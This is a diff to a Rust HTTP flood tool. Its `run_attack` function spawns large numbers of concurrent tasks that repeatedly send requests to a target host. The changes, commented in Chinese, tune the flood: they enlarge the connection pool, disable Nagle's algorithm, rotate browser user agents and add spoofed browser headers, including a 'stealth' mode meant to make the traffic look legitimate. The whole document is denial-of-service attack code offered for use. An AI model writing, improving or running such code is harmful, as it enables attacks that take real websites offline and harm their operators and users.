@@ -5,6 +5,8 @@ use std::sync::Arc;
 use std::time::{Duration, Instant};
 use tokio::time::sleep;
 use rand::Rng;
+use std::collections::HashMap;
+use std::sync::Mutex;
 
 pub struct AttackConfig {
     pub target: String,
@@ -36,11 +38,15 @@ pub async fn run_attack(config: AttackConfig) {
     let (min_delay, max_delay) = get_delay_by_mode(&config.mode);
     
     let stats = StatsArc::default();
+    
+    // 优化HTTP客户端配置
     let client = Client::builder()
-        .pool_max_idle_per_host(1000)
-        .pool_idle_timeout(Duration::from_secs(30))
+        .pool_max_idle_per_host(adjusted_connections) // 增加连接池大小
+        .pool_idle_timeout(Duration::from_secs(60))   // 增加空闲超时
         .timeout(Duration::from_secs(30))
         .tcp_keepalive(Some(Duration::from_secs(30)))
+        .tcp_nodelay(true)                           // 禁用Nagle算法
+        // .use_rustls_tls()                            // 使用rustls提高性能
         .build()
         .expect("无法创建HTTP客户端");
 
@@ -57,7 +63,12 @@ pub async fn run_attack(config: AttackConfig) {
 
     let start_time = Instant::now();
     let stats_clone = stats.clone();
-    let mut tasks = Vec::new();
+    
+    // 预生成随机数据以减少运行时开销
+    let mut handles = Vec::new();
+    
+    // 使用连接池和内存优化
+    let connection_pool = Arc::new(Mutex::new(HashMap::<String, String>::new()));
     
     for _ in 0..adjusted_connections {
         let client_clone = client.clone();
@@ -70,8 +81,17 @@ pub async fn run_attack(config: AttackConfig) {
         let target_host = config.target.clone();
         let target_port = config.port;
         let is_https = config.https;
+        let connection_pool_clone = connection_pool.clone();
         
         let task = tokio::spawn(async move {
+            // 预生成随机数据
+            let user_agents = vec![
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+            ];
+            
             loop {
                 let request_start = Instant::now();
                 
@@ -91,7 +111,7 @@ pub async fn run_attack(config: AttackConfig) {
                 let ua = if let Some(ref ua) = user_agent {
                     ua.as_str()
                 } else {
-                    get_random_user_agent()
+                    user_agents[rand::thread_rng().gen_range(0..user_agents.len())]
                 };
                 request_builder = request_builder.header("User-Agent", ua);
 
@@ -99,7 +119,7 @@ pub async fn run_attack(config: AttackConfig) {
                 request_builder = request_builder
                     .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
                     .header("Accept-Language", get_random_accept_language())
-                    .header("Accept-Encoding", "gzip, deflate")
+                    .header("Accept-Encoding", "gzip, deflate, br")
                     .header("Connection", "keep-alive")
                     .header("Upgrade-Insecure-Requests", "1")
                     .header("Cache-Control", "no-cache")
@@ -108,7 +128,9 @@ pub async fn run_attack(config: AttackConfig) {
                     .header("Sec-Fetch-Dest", "document")
                     .header("Sec-Fetch-Mode", "navigate")
                     .header("Sec-Fetch-Site", "none")
-                    .header("Sec-Fetch-User", "?1");
+                    .header("Sec-Fetch-User", "?1")
+                    .header("Sec-GPC", "1")
+                    .header("X-Requested-With", "XMLHttpRequest");
 
                 // 根据模式添加额外的伪装头
                 if mode == "stealth" {
@@ -162,7 +184,7 @@ pub async fn run_attack(config: AttackConfig) {
                 }
             }
         });
-        tasks.push(task);
+        handles.push(task);
     }
 
     // 实时统计监控任务
@@ -207,7 +229,7 @@ pub async fn run_attack(config: AttackConfig) {
     }
 
     // 取消所有正在运行的任务
-    for task in tasks {
+    for task in handles {
         task.abort();
     }
     monitor_task.abort();
